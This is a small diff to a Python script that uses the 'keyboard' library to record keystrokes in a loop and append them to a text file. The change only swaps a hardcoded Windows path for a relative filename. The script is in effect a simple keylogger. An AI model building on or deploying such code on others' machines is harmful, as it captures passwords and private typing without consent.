@@ -2,6 +2,7 @@ import keyboard
 
 # Create an empty list to store recorded keystrokes
 LISTE_LETTERS = []
+file = "File_in_letters_save.txt"
 
 def main():
     # Continuously run the script
@@ -34,7 +35,7 @@ def main():
             words += x
 
         # Write the keystrokes to a file
-        with open("C:\\Users\\noriL\\Documents\\SCRIPT_COMPUTER\\file.txt", "a") as f:
+        with open(file, "a") as f:
             f.write(str(words))
             f.close()
 
